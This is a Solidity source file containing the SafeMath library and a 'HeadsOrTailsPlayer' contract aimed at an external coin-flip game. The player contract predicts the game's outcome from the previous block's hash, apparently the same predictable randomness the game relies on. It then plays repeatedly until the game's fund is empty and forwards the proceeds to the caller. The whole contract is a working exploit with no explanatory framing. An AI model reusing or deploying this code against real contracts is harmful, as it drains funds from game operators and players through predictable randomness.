pragma solidity ^0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that revert on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, reverts on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring &#39;a&#39; not being zero, but the
    // benefit is lost if &#39;b&#39; is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b);

    return c;
  }

  /**
  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold

    return c;
  }

  /**
  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;

    return c;
  }

  /**
  * @dev Adds two numbers, reverts on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);

    return c;
  }

  /**
  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
  * reverts when dividing by zero.
  */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

contract HeadsOrTails {

    uint256 public gameFunds;
    uint256 public cost;

    function play(bool _heads) external payable;

}
contract HeadsOrTailsPlayer {
    using SafeMath for uint256;
    event Income(uint256 income, uint256 total);
    event Transfer(uint256 value);
    address owner;

    constructor() public {
      owner = msg.sender;
    }
    function() public payable
    {
        emit Income(msg.value, address(this).balance);
    }
    function play(address _addr) external payable
    {
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        bool heads = (coinFlip == 1);
        HeadsOrTails server = HeadsOrTails(_addr);
        uint256 cost = server.cost();
        while(server.gameFunds() > 0) {
          server.play.value(cost)(heads);
        }
        if(address(this).balance > 0) {
          uint256 val = address(this).balance;
          msg.sender.transfer(val);
          emit Transfer(val);
        }
    }

    function refund() external
    {
      require(msg.sender == owner);
      require(address(this).balance > 0);
      msg.sender.transfer(address(this).balance);
    }
}